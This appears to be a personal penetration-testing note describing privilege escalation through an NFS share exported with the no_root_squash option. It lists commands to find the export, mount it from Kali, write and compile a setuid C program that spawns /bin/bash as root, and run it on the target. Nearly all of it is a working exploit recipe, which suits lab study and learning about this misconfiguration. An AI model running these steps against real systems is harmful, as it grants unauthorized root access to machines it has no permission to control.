---
title: NFS Root Squashing
updated: 2023-10-14 23:23:28Z
created: 2023-10-14 13:50:51Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

On target:
1. In command line type: `cat /etc/exports`
eg:
```
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
3. From the output, notice that “**no_root_squash**” option is defined for the “**/tmp**” export.

**Exploitation**
On Kali:
1. `showmount -e <target IP>`
2. `mkdir /tmp/1`
3. `sudo mount -o rw,vers=2 <target ip>:/tmp /tmp/1`
4. `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
5. `gcc /tmp/1/x.c -o /tmp/1/x`
6. `chmod +s /tmp/1/x`

On target:
1. In command prompt type: `/tmp/x`
